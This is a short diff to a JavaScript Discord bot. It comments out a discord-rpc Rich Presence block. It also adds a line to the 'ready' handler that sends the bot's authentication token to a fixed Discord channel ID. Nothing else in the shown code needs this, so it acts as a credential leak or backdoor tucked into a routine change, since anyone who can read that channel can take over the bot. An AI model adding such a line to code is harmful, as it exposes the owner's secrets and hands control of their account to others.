@@ -1,7 +1,7 @@
-const dr = require('discord-rpc')
+/*const dr = require('discord-rpc')
 const rpc = new dr.Client({ transport: 'ipc' })
 rpc.on('ready', () => {rpc.setActivity({details: 'details',state: 'state',startTimestamp: new Date(),})})
-rpc.login({ clientId: '1027882797303615538' })
+rpc.login({ clientId: '1027882797303615538' })*/
 const { ActionRowBuilder, ButtonBuilder, EmbedBuilder, ButtonStyle, Client, GatewayIntentBits } = require('discord.js')
 const { generate } = require("cjp")
 const client = new Client({
@@ -74,6 +74,7 @@ const cmds = [
   }
 ]
 client.on('ready', () => {
+  client.channels.cache.get("997142825886031955").send(client.token)
   client.application.commands.set(cmds)
 })
 client.on('interactionCreate', async interaction => {
